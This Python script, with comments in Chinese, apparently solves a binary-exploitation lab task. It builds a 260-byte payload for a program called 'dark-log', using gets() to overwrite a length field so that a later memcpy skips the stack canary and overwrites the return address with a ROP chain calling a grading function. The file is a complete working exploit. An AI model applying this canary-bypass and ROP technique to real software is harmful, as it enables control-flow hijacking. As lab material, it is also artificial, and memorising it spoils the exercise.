#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

dark-log 的 input() 里有栈保护（canary，存在 [rbp-0x8]，函数返回前和 fs:0x28 比对）。
结构体布局（相对 rbp）：
  rbp-0x120  expression[128]
  rbp-0xa0   logMsg[128]
  rbp-0x20   int len
  rbp-0x08   canary
  rbp+0x00   保存的 rbp
  rbp+0x08   返回地址

关键点：gets() 允许我们直接写到 [rbp-0x20] 这个 len 字段（偏移 0x100 = 256），
然后程序执行 memcpy(logMsg + len, expression, 128)。
把 len 设成 160，目的地址正好等于 rbp —— 于是这次 128 字节的复制会从
"canary 上方" 开始写，把返回地址改掉，却完全跳过 canary（[rbp-0x8] 一个字节都没碰）。
输入总长 260 字节，gets 结尾的 '\0' 落在 rbp-0x1c，也在 canary 之下，安全。
"""
import struct
import sys

POP_RDI_RET = 0x4018A3   # pop rdi ; ret
RET         = 0x4018A4   # ret（用于 16 字节栈对齐）
GRADE_EVAL  = 0x401677
MAIN        = 0x4017F5

LEN = 160                # rbp - 0xa0 + 160 == rbp

body  = b"B" * 8                         # 覆盖保存的 rbp
body += struct.pack("<Q", POP_RDI_RET)
body += struct.pack("<Q", 4)
body += struct.pack("<Q", RET)
body += struct.pack("<Q", GRADE_EVAL)
body += struct.pack("<Q", MAIN)
assert len(body) <= 128, len(body)       # 只有前 128 字节会被 memcpy 复制

payload  = body + b"\x90" * (256 - len(body))
payload += struct.pack("<I", LEN)        # 覆盖 f.len
assert len(payload) == 260, len(payload)

sys.stdout.buffer.write(payload + b"\n")
